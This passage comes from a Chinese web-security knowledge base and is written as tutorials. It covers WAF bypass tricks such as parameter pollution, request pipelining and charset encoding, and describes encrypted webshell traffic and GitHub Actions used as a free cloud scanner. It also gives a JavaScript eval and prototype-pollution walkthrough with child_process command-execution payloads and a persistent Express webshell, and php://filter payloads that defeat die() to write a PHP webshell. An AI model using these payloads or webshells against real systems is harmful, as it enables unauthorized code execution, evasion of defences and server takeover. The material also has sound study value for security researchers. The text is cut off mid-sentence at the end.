0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果参数污染（HPP） 简单来说，存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包：GET /foo?par=first&par=last HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 部分中间件的处理方法： Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(\"par\") last JSP/Tomcat Request.getParameter(\"par\") first Perl(CGI)/Apache Param(\"par\") first Python/Apache getvalue(\"par\") [\"first\",\"last\"] ASP.NET/IIS Request.QueryString(\"par\") first,last Pipeline（keep-alive） http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 大概数据包就是这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 3 a=1GET / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: close HTTP charset 利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果 application/x-www-form-urlencoded; charset=ibm037 multipart/form-data; charset=ibm037, boundary=blah multipart/form-data; boundary=blah ; charset=ibm037 WAF特性 云WAF绕过 找到真实IP，修改本地hosts文件或者直接在burp中指定解析，避免流量走到云WAF上即可。 白名单绕过 一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF设立了白名单/admin，那么我们的测试payload可以通过如下的手法来绕过 # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?a=/admin&id=123 and 2*3=6 静态文件绕过 一些WAF为了减少服务器的压力，会对静态文件如.png、.css等直接放行，那么我们可以尝试伪装成静态文件来绕过 如： # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?1.jpg&id=123 and 2*3=6 Content-Type绕过 一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 解析兼容性 一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时 filename=\"shell.php\" 我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截 filename=\"shell.php filename='shell.php' filename=shell.php 容器特性 [!tip] 可通过所有fuzz一遍，看看容器是如何处理的 IIS+ASP： %会被自动去掉 unicode会自动解码 == tomcat: 路径穿越 /path1/path2/ == ;/path1;foo/path2;bar/; 参考 waf绕过拍了拍你 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:31:08 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/01.WAF绕过通用思路.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/02.蚁剑RSA加密绕过检测.html":{"url":"知识库/01.WEB安全/11.其他/02.蚁剑RSA加密绕过检测.html","title":"02.蚁剑RSA加密绕过检测","keywords":"","body":"新增了PHP RSA编码器，下拉菜单中找到编码设置，点击RSA配置点击生成会生成一段PHP shell代码。 点击新建编码器创建一个PHP RSA编码器 选择编码器为刚刚创建的PHP RSA编码器测试连接 流量已经完全加密 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:30:04 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/02.蚁剑RSA加密绕过检测.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/03.GitHub云扫描器.html":{"url":"知识库/01.WEB安全/11.其他/03.GitHub云扫描器.html","title":"03.GitHub云扫描器","keywords":"","body":" 前言 过程举例 分析 GitHub Actions 是什么？ 基本概念 workflow 文件 name on on.. jobs..name jobs..needs jobs..runs-on jobs..steps PortScan-AllPort分析 举一反三 前言 GitHub提供六小时的容器使用时长。 可以利用其进行对外的端口扫描、目录扫描等操作。 过程举例 https://github.com/inbug-team/InCloud 运行于GitHub Actions 的仓库中自动化、自定义和执行软件开发工作流程，可以自己根据喜好定制功能，InCloud已经为您定制好了八种针对网段和域名的不同场景的信息收集与漏洞扫描流程。 PortScan-AllPort 对单IP文件列表进行全端口扫描，输出可用Web服务标题。 PortScan-AllPort-Xray-Dirscan 对单IP文件列表进行全端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描，对Web服务进行Ffuf目录递归扫描。。 PortScan-Top1000 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题。 PortScan-Top1000-Xray 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 PortScan-Top1000-Dirscan 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 SubDomain-Portscan-Vulnscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Nuclei漏洞扫描。 SubDomain-Portscan-Xray 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 SubDomain-Portscan-Dirscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 这里以端口扫描为例 1、将项目fork到自己的github，选择端口扫描的分支。 2、修改流程文件（.github/workflows/incloud.yaml）里的 git config --local user.email 与 git config --global user.name 改成自己的邮箱与自己的ID（用于报告输出，可忽略）。 3、修改input目录的扫描目标 4、使用action标签进行在线编译。 5、查看运行的任务 6、点击build可查看对应的运行过程 7、GitHub提供六小时的容器使用时长，扫描结束后，扫描结果会自动上传到自己fork的output文件夹下。 8、需要更新最新版本，请删除fork的项目再重新fork此项目。 分析 GitHub Actions 入门教程 GitHub官方文档 GitHub官方市场 GitHub Actions 是什么？ 大家知道，持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub 把这些操作就称为 actions。 很多操作在不同项目里面是类似的，完全可以共享。GitHub 注意到了这一点，想出了一个很妙的点子，允许开发者把每个操作写成独立的脚本文件，存放到代码仓库，使得其他开发者可以引用。 如果你需要某个 action，不必自己写复杂的脚本，直接引用他人写好的 action 即可，整个持续集成过程，就变成了一个 actions 的组合。这就是 GitHub Actions 最特别的地方。 GitHub 做了一个官方市场，可以搜索到他人提交的 actions。另外，还有一个 awesome actions 的仓库，也可以找到不少 action。 上面说了，每个 action 就是一个独立脚本，因此可以做成代码仓库，使用userName/repoName的语法引用 action。比如，actions/setup-node就表示github.com/actions/setup-node这个仓库，它代表一个 action，作用是安装 Node.js。事实上，GitHub 官方的 actions 都放在 github.com/actions 里面。 既然 actions 是代码仓库，当然就有版本的概念，用户可以引用某个具体版本的 action。下面都是合法的 action 引用，用的就是 Git 的指针概念，详见官方文档。 actions/setup-node@74bc508 # 指向一个 commit actions/setup-node@v1.0 # 指向一个标签 actions/setup-node@master # 指向一个分支 基本概念 GitHub Actions 有一些自己的术语。 （1）workflow （工作流程）：持续集成一次运行的过程，就是一个 workflow。 （2）job （任务）：一个 workflow 由一个或多个 jobs 构成，含义是一次持续集成的运行，可以完成多个任务。 （3）step（步骤）：每个 job 由多个 step 构成，一步步完成。 （4）action （动作）：每个 step 可以依次执行一个或多个命令（action）。 workflow 文件 GitHub Actions 的配置文件叫做 workflow 文件，存放在代码仓库的.github/workflows目录。 workflow 文件采用 YAML 格式，文件名可以任意取，但是后缀名统一为.yml，比如foo.yml。 一个库可以有多个 workflow 文件。GitHub 只要发现.github/workflows目录里面有.yml文件，就会自动运行该文件。 workflow 文件的配置字段非常多，详见官方文档。下面是一些基本字段。 name name字段是 workflow 的名称。如果省略该字段，默认为当前 workflow 的文件名。 name: GitHub Actions Demo on on字段指定触发 workflow 的条件，通常是某些事件。 on: push 上面代码指定，push事件触发 workflow。 on字段也可以是事件的数组。 on: [push, pull_request] 上面代码指定，push事件或pull_request事件都可以触发 workflow。 完整的事件列表，请查看官方文档。除了代码库事件，GitHub Actions 也支持外部事件触发，或者定时运行。 on.. 指定触发事件时，可以限定分支或标签。 on: push: branches: - master 上面代码指定，只有master分支发生push事件时，才会触发 workflow。 jobs..name workflow 文件的主体是jobs字段，表示要执行的一项或多项任务。 jobs字段里面，需要写出每一项任务的job_id，具体名称自定义。job_id里面的name字段是任务的说明。 jobs: my_first_job: name: My first job my_second_job: name: My second job 上面代码的jobs字段包含两项任务，job_id分别是my_first_job和my_second_job。 jobs..needs needs字段指定当前任务的依赖关系，即运行顺序。 jobs: job1: job2: needs: job1 job3: needs: [job1, job2] 上面代码中，job1必须先于job2完成，而job3等待job1和job2的完成才能运行。因此，这个 workflow 的运行顺序依次为：job1、job2、job3。 jobs..runs-on runs-on字段指定运行所需要的虚拟机环境。它是必填字段。目前可用的虚拟机如下。 ubuntu-latest，ubuntu-18.04或ubuntu-16.04 windows-latest，windows-2019或windows-2016 macOS-latest或macOS-10.14 下面代码指定虚拟机环境为ubuntu-18.04。 runs-on: ubuntu-18.04 jobs..steps steps字段指定每个 Job 的运行步骤，可以包含一个或多个步骤。每个步骤都可以指定以下三个字段。 jobs..steps.name：步骤名称。 jobs..steps.run：该步骤运行的命令或者 action。 jobs..steps.env：该步骤所需的环境变量。 下面是一个完整的 workflow 文件的范例。 name: Greeting from Mona on: push jobs: my-job: name: My Job runs-on: ubuntu-latest steps: - name: Print a greeting env: MY_VAR: Hi there! My name is FIRST_NAME: Mona MIDDLE_NAME: The LAST_NAME: Octocat run: | echo $MY_VAR $FIRST_NAME $MIDDLE_NAME $LAST_NAME. 上面代码中，steps字段只包括一个步骤。该步骤先注入四个环境变量，然后执行一条 Bash 命令。 PortScan-AllPort分析 name: incloud # workflow名称 on: workflow_dispatch: # 手动触发 jobs: # 任务 build: # job id runs-on: ubuntu-latest # 指定运行所需要的虚拟机环境 steps: # 步骤 # Checkout a Git repository at a particular version - name: Checkout Repo # 步骤名 uses: actions/checkout@master # 指向一个分支 https://github.com/marketplace/actions/checkout # 配置Go环境 - name: Setup golang uses: actions/setup-go@v2 # https://github.com/marketplace/actions/setup-go-environment with: go-version: 1.14 # 安装依赖 - name: Setup Dependencies run: sudo apt-get install libpcap-dev - name: Cache Go id: cache-go uses: actions/cache@v2 with: path: /home/runner/go key: ${{ runner.os }}-go - name: Setting up ProjectDiscovery tools if: steps.cache-go.outputs.cache-hit != 'true' env: GO111MODULE: on run: | go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder go get -v github.com/projectdiscovery/dnsx/cmd/dnsx go get -v github.com/projectdiscovery/naabu/v2/cmd/naabu go get -v github.com/projectdiscovery/httpx/cmd/httpx go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei shell: bash - name: Running naabu to check top all ports run: | naabu -iL input/target.txt -rate 10000 -p - | tee output/active_ports.txt shell: bash - name: Running httpx for HTTP webservers probbing run: | httpx -l output/active_ports.txt -title httpx -l output/active_ports.txt | tee output/active_urls.txt shell: bash - name: Sorting the output results run: | find output -type f -exec sort {} -o {} \\; shell: bash # 更新扫描结果到github仓库中 - name: Create local changes run: | git add output/active_ports.txt git add output/active_urls.txt - name: Commit results to Github run: | git config --local user.email \"admin@inbug.org\" git config --global user.name \"inbug-team\" git commit -m \"InCloud Report\" -a --allow-empty - name: Push changes uses: ad-m/github-push-action@master with: github_token: ${{ secrets.GITHUB_TOKEN }} branch: ${{ github.ref }} 举一反三 分析发现也不是特别麻烦 只需要 配置环境 --> 安装工具 --> 下发扫描任务 --> 上传报告 即可 后续可根据自己的需求，编写特定的workflow执行相应的任务。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:26:22 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/03.GitHub云扫描器.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/04.JavaScript原型链污染.html":{"url":"知识库/01.WEB安全/11.其他/04.JavaScript原型链污染.html","title":"04.JavaScript原型链污染","keywords":"","body":" 变量类型 什么是原型，原型链 原型 原型链 Demo payload_1 payload_2 payload_3 漏洞利用 0x1 命令执行 0x2 如何向Node.js 服务上传webshell 变量类型 在JavaScript中，有6种原始值分别是： boolean number string undefined symbol null 3种引用类型，分别是： 对象 (Object) 数组 (Array) 函数 (Function) 引用类型都是对象，通过 instanceof 操作符来判断对象的类型 JavaScript instanceof 能判断对象的原理就是判断一个对象与其构造函数是否在同一个原型链上，但其实instanceof用来判断类型并不准确，常用Object.prototype.toString.call()来判断数据类型 什么是原型，原型链 原型 JavaScript的所有对象(实例)中都包含一个__proto__内部属性，这个属性所对应的就是该对象的原型，对象都从原型继承方法和属性 JavaScript的函数对象，除了原型__proto__属性之外，还预置了prototype属性，当函数对象作为构造函数创建实例的时候，该prototype属性将被作为实例对象的原型__proto__ 构造函数new的时候发生了什么？ var obj = {}; obj.__proto__ = Base.prototype Base.call(obj) 创建一个新的对象obj 将这个空对象的__proto__成员指向Base函数对象prototype成员对象 Base函数对象的this指针替换成obj，相当于执行Base.call(obj) 如果构造函数显示地返回一个对象，那么这个实例则为返回的对象，否则返回这个新创建的对象。 普通对象的原型 函数对象（构造函数）的prototype === 实例对象的原型 原型链 任何一个实例对象通过原型链都可以找到它对应的原型对象，并且原型对象上面的实例和方法都是被实例所共享的，一个对象在查找一个方法或者属性时，他会先在自己的对象中找，如果找不到，就会沿着原型链依次向上找，直到最后到Object 函数才有prototype，实例对象只有__proto__，而函数有__proto__是因为函数是Function对象的实例 在这里我创建一个obj，里面只有 name和 age属性，然后在其原型上创建msg属性，getMsg 方法，然后该对象中不存在msg属性，getMsg方法，但是当需要使用 msg 属性，getMsg 方法的时候，JavaScript就会沿着原型链去寻找msg属性，getMsg方法，如果找到了就返回，如果直到顶层object都没有，则返回undefined 那么是不是我修改了Object的prototype是不是就可以为所欲为了？并不是这样，当对象当前无属性或者方法的时候，才会一层一层通过原型链去查找原型上的方法或属性，当存在该属性或者方法的时候，则会停止向上查找，且直接返回。所以当在原型链上只要有一个原型存在该方法，则不会调用Object原型中的方法。 Demo 我使用Node.js 启动一个web环境（Express），代码如下： const express = require('express') const app = new express() const obj = { getMsg: 'hello world', getList: getReadMsg() } function getReadMsg(){ return 'test' } Object.freeze(obj) app.get('/', (req, res) => { const resp = eval('obj.' + req.query.test) res.send(resp) }) app.listen( 8081,()=>{ console.log('running on 8081 port!') }) 注意，在这里使用了eval方法，（eval方法会使用JavaScript解释该字符串），且对象表示法使用了点表示法取对象的属性或者方法 可以看见，test 参数处可拼接属性值，并使用对象点表示法，执行对象。 在这里有Object.freeze(obj)，这里表示冻结该对象，不允许对对象属性进行修改 payload_1 针对obj.getMsg / obj.getList 的原型进行构造payload ?test=getMsg.__proto__.secFunc=function(){return+\"secTest,hello+world\"} ?test=getMsg.__proto__.secFunc() => ?test=getMsg.__proto__.secFunc=function(){return+\"secTest,hello+world\"}() 原理： obj.getMsg 的类型是String类型，字符串方法全都源自其原型上的方法，那么将secFunc方法写在其原型上，然后再调用 // 这里的secFunc 是一个 Function obj.getMsg.__proto__.secFunc = function(){return \"secTest,hello world\"} // 调用该方法 obj.getMsg.secFunc() // 或者 指定第一层原型上的secFunc方法 obj.__proto__.secFunc() // 又因为以下表达式会返回一个function，那么在JavaScript里，只要返回值是function在其后加上括号即可立即执行方法 obj.getMsg.__proto__.secFunc = function(){return \"secTest,hello world\"}() payload_2 存在Object.freeze 方法，不允许在object里添加属性，那么给他的原型添加方法并调用 ?test=__proto__.secTest=function(){return \"secTest,hello world\"} ?test=secTest() => ?test=__proto__.secTest=function(){return \"secTest,hello world\"}() payload_3 向该对象添加立即执行函数 ?test=secTest=function(){return \"secTest,hello world\"}() 漏洞利用 以该demo作为漏洞环境，使用node.js的child_process模块，完成命令执行 0x1 命令执行 ?test=secTest=function(){return+require('child_process').execSync('whoami')}() 这里的require('child_process').execSync(command)中的execSync是指同步执行，并将结果返回回来，如果是使用exec方法，在JavaScript中会将其构造成异步任务，取数据要从promise/或者使用回调函数取，对于攻击者并不友好，所以我们使用时间换效率的方式来完成命令执行 0x2 如何向Node.js 服务上传webshell 关于Node.js 上传webshell我查阅了很多文档，其实都没有说得很明白，我以前是搞web开发的，所以还是或多或少了解JavaScript的特性，node.js启动的web服务，其实和serlvet，apache有很明显的区别，servlet，apache等都可以解析相应的.php,.jsp文件，而虽说node.js也有模板语法，但是Node只解析相应的模板文件，这种模板文件都是静态文件，只是提供数据渲染，而不是动态执行，所以基于node.js，python的模板解析上传可解析的文件，其实是不奏效的，并不能执行命令，因为node.js，python启动的web服务，是通过进程启动，所以我们要使其执行应该使用js文件，那么要达成可视化的webshell，通过这个demo，使用命令执行，启动一个新的端口，来执行命令 思路01 ?test=getMSg;Reflect.construct(Function,[res.send(require('child_process').execSync('whoami'))]) 分号用于换行，在ESlint中，是舍弃了分号，但是如果没有较好的编码规范或者良好的打包方式，如果将代码写成一行，则会造成代码不可读 Reflect是JavaScript的一个内置对象，Reflect.construct() 方法的行为有点像 new 操作符 构造函数 ， 相当于运行 new target(...args) 语法如下： Reflect.construct(target, argumentsList[, newTarget]) target为Function，argunmentList则为需要传入的方法，再此处就将结果返回回来，在这里就可以看见我们执行了whoami并回显回来了 在未使用return 返回结果的时候，使用该方式发现又可以代码执行，那么再启动一个端口，用于执行命令，就达到了webshell的功能 这里我图方便没有使用nodejs的http模块启动，而是使用express模块执行（需要下载express库） 代码 const express_1 = require('express') const app_1 = new express_1() app_1.get('/', (req_1, res_1)=>{ res_1.header('Content-Type','text/html') res_1.send(require('child_process').execSync(req_1.query.cmd)) }) app_1.listen('8888') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:43:58 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/04.JavaScript原型链污染.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/05.phpfilter协议利用.html":{"url":"知识库/01.WEB安全/11.其他/05.phpfilter协议利用.html","title":"05.phpfilter协议利用","keywords":"","body":" 背景 php://filter 协议利用 介绍 使用 读取文件 写入文件 分析 0x1 base64 编码 0x2 字符串操作+base64组合拳 0x3 ROT13 编码 其他利用 文件包含 XXE 参考链接 背景 屈总今天给了一个CTF题，看起来很简单，但是细看要是不了解file_put_contents利用技巧，这个题也解不出来，先看代码 \\n\"; $content = $data.base64_decode($_GET['data']); echo $content; file_put_contents($_GET['path'], $content); echo 'OK'; } else{ highlight_file(__FILE__); } ?> poc如下 http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaUEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr 效果如下 通过这个题，通过使用php://filter来构造相关payload以达到写入webshell，来达到控制服务器的目的，但其危害并不只如此，还可以配合使用文件包含，文件读取，反序列化，XXE等组合攻击。 借此机会来学习学习，探索php://filter的相关姿势 php://filter 协议利用 介绍 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器 php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例 名称 描述 resource= 这个参数是必须的。它指定了你要筛选过滤的数据流。 read= 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write= 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 使用 根据上述介绍的 使用方法，使用如下测试代码，来进行测试 读取文件 # payload 明文读取 http://localhost/test.php?file1=testfile.txt # payload 编码读取，这里使用base64编码 http://localhost/test.php?file1=php://filter/read=convert.base64-encode/resource=testfile.txt 写入文件 # payload 明文写入 http://localhost/test.php?file2=testfile.txt&txt=123456+by+aaron # payload 编码写入，这里使用base64 编码 http://localhost/test.php?file2=php://filter/write=convert.base64-encode/resource=testfile.txt&txt=123456+by+aaron 分析 在了解了filter协议的情况下，我们来分析一下这个题，$content拼接了$data和base64_decode($_GET['data'])，在$data中，由于存在die()方法，而die() 函数的作用是输出一条消息，并退出当前脚本，意思是die()函数后的所有php代码都不生效，所以解这个题的核心是将$data变量污染，从而达到绕过die()函数，执行可控的php代码 0x1 base64 编码 base64 编码/解码原理 使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode 函数特性去除die()函数 首先我们知道，base64编码中只包含64个字符(0-9,a-z,A-Z,+,/)，其中=为补位码也就是(000000) ，而PHP在解base64编码的时候，遇到不在其可识别的字符的时候，将会跳过这些字符，仅将合法字符组合成一个新的字符再解码 所以当$content被加上了 之后，就会有共计10个字符不能被识别而被忽略，最终被解码的字符只有phpdienophp，和我们传入的字符串 phpdienophp字符串只有11个字节，base64解码为4字节一组，再算上我们需要编码两次的shell=UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr(32字节)，首先传入的字符需要base64解码一次，所以UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr解码为PD9waHAgcGhwaW5mbygpOz8+(24字节)，在filter的base64解码中，24+11=35，35 6 mod 24 = -6 那么就是说还需要可被base64认识的1字节，这1字节只能添加在编码的shell前用来闭合前面的11字节字符，使其能够通过base64编码，即xPD9waHAgcGhwaW5mbygpOz8+,但是题目中对传入的参数进行base64解码了1次，那么垃圾数据应该填充在UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr这里，这个双编码的字节数为32，解码后要多1位的话，那么就需要填充4个字节为36位（32/43=24，未填充的字符解码数，要能正常解码的情况下=> 249/6 = 36，解码出来的字符数为 36/43=27） 因为base64只识别64个字符，所以从000000-111111，而ascii码是00000000-11111111，从ascii -> base64 或者从 base64 - ascii 取最小公倍数24，所以是3字节1组编码，4字节1组解码 填充垃圾数据为aaaaUEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr，解码出来为i��PD9waHAgcGhwaW5mbygpOz8+,在这27位中，第2位，第3位不能被识别，那么filter的base64解码就只有25+11 = 36 位，然后就能利用成功了 那么对小马而言的话 // base64 双重编码 // UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== // 56 位，遇到==需要丢掉，所以需要-2 则 第一次解码出来的位数为 56/4*3-2=40 // 40+11=51,需要1位垃圾数据或者5位，或者4n+4-51(n>=12) //垃圾数据aaaa解码出来3位，2位不可识别，只有1位可被识别 // 41+11=52 位 52/4*3=39 payload http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaaaaaaaaaaaaaaaaaUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== 0x2 字符串操作+base64组合拳 除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除。我们观察一下，这个，实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的 编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果： 可见，被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。 万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。die函数在第一步被去除，而webshell在第二步被还原。 ?path=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&data=UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr 0x3 ROT13 编码 原理和上面类似，核心是将die()函数去除。在经过rot13编码后会变成，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了 payload ?path=php://filter/write=string.rot13/resource=shell.php&data=PD9jdWMgY3VjdmFzYigpOz4= 其他利用 文件包含 文件包含漏洞顾名思义即：包含恶意代码或恶意内容达到一定的攻击效果。 在文件包含漏洞当中，因为php://filter可以对所有文件进行编码处理，所以常常可以使用php://filter来包含读取一些特殊敏感的文件（配置文件、脚本文件等）以辅助后面的漏洞挖掘。 测试代码 payload ?file=php://filter/read=convert.base64-encode/resource=test.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计 payload 少read关键字 ，在绕waf的时候或许有用，我也记录一下吧 ?file=php://filter/convert.base64-encode/resource=test.php XXE php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。 那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。 在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。 测试代码 methodname; ?> ]> &abc; 参考链接 file_put_contents利用技巧(php://filter协议) 探索php://filter在实战当中的奇技淫巧 谈一谈php://filter的妙用 php:// 协议官方文档 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:30:53 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/05.phpfilter协议利用.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/06.单点登录SSO原理.html":{"url":"知识库/01.WEB安全/11.其他/06.单点登录SSO原理.html","title":"06.单点登录SSO原理","keywords":"","body":" 简介 技术实现 普通认证机制 同域下的单点登录 不同域下的单点登录 CAS基本协议过程 名词解释 image.png 步骤一 步骤二 步骤三 步骤四 步骤五 步骤六 简易步骤 总结 参考链接 简介 在企业发展初期，企业使用的系统很少，通常一个或者两个，每个系统都有自己的登录模块，运营人员每天用自己的账号登录，很方便。 但随着企业的发展，用到的系统随之增多，运营人员在操作不同的系统时，需要多次登录，而且每个系统的账号都不一样，这对于运营人员 来说，很不方便。于是，就想到是不是可以在一个系统登录，其他系统就不用登录了呢？这就是单点登录要解决的问题。 单点登录英文全称Single Sign On，简称就是SSO。它的解释是：在多个应用系统中，只需要登录一次，就可以访问其他相互信任的应用系统。 如上图所示，图中有4个系统，分别是Application1、Application2、Application3、和SSO。Application1、Application2、Application3没有登录模块，而SSO只有登录模块，没有其他的业务模块，当Application1、Application2、Application3需要登录时，将跳到SSO系统，SSO系统完成登录，其他的应用系统也就随之登录了。这完全符合我们对单点登录（SSO）的定义。 技术实现 普通认证机制 当用户在浏览器（Browser）中访问一个应用，这个应用需要登录，再填写完用户名和密码之后，完成登录认证。这时这个用户的Session中，登录状态为yes（已登录），同时服务端会发送Cookie到客户端，浏览器(Browser)就会写下（保存）一份Cookie，这个Cookie就是用户的唯一标识。下次用户再访问这个应用的时候，请求中就会携带Cookie，服务端会根据这个Cookie找到对应的Session，通过Session来判断这个用户是否登录。 同域下的单点登录 一个企业一般情况下只有一个域名，通过二级域名区分不同的系统。比如我们有个域名叫做：a.com，同时有两个业务系统分别为：app1.a.com和app2.a.com。我们要做单点登录（SSO），需要一个登录系统，叫做：sso.a.com 我们只要再sso.a.com登录，app1.a.com和app2.a.com也就登录了。通过上面的登录认证机制，我们可以知道，在sso.a.com中登录之后，其实是在sso.a.com的服务端的Session中记录了登录状态，同时在浏览器端的sso.a.com下写入了Cookie，那么我们怎么才能让app1.a.com和app2.a.com登录呢？这里存在两个问题 Cookie 是不能跨域的，Cookie的domain属性是sso.a.com，在给app1.a.com 和 app2.a.com发送请求是带不上的 sso、app1、app2 